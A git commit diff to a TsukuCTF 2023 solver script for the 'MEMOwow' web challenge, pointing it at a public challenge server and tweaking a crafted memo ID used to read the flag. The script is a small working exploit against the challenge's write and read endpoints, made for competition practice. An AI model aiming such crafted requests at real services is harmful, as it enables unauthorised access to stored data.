7b7207215022c7f13c94ae8c3f8d5ab8e17997c0
Satoki <t.satoki111@gmail.com>
2023-12-08 22:20:04 +0900

    add

--- web/MEMOwow/solver/solver.py
+++ web/MEMOwow/solver/solver.py
@@ -2,7 +2,7 @@ import re
 import base64
 import requests
 
-URL = "http://localhost:31415/"
+URL = "http://133.130.100.34:31415/"
 
 session = requests.Session()
 
@@ -11,7 +11,7 @@ session.get(f"{URL}")
 res = session.post(f"{URL}/write", data={"content": base64.b64decode(b"////////flag")})
 print(f"[POST] /write: {res.status_code}")
 
-res = session.post(f"{URL}/read", data={"memoid": "////////fla@@@@g"})
+res = session.post(f"{URL}/read", data={"memoid": "////////fla@g"})
 print(f"[POST] /read: {res.status_code}")
 flag = re.search("TsukuCTF23{.*?}", res.text)
 print(f"[FLAG] {flag.group()}")
